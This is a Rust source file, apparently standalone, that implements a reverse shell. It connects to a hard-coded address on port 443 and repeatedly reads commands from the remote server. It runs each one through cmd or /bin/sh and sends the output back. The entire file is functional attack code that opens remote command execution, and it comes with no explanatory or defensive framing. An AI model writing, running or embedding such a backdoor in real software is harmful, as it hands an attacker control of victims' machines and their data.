use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;
use std::str;
//use std::ffi::OsStr;

fn main() {
    let mut server_stream =
        TcpStream::connect("192.168.1.75:443").expect("Could not connect to the server !");
    loop {
        let mut server_cmd: Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&server_stream);
        reader
            .read_until(b'\n', &mut server_cmd)
            .expect("Could not read into buffer");
        //print!("{}",str::from_utf8(&server_cmd).expect("Error in writing buffer as string"));
        let cmd = str::from_utf8(&server_cmd).unwrap();
        //let win_cmd: &OsStr = OsStr::new(cmd);
        if cfg!(windows) {
            if let Ok(command) = Command::new("cmd").arg("/c").arg(cmd).output() {
                let cmdout = String::from_utf8_lossy(&command.stdout).to_string();
                //println!("{}", cmdout);
                server_stream
                    .write(cmdout.as_bytes())
                    .expect("Failed to write to server");
            }
        } else {
            if let Ok(command) = Command::new("/bin/sh").arg("-c").arg(cmd).output() {
                let cmdout = String::from_utf8_lossy(&command.stdout).to_string();
                //println!("{}", cmdout);
                server_stream
                    .write(cmdout.as_bytes())
                    .expect("Failed to write to server");
            }
        }
    }
}
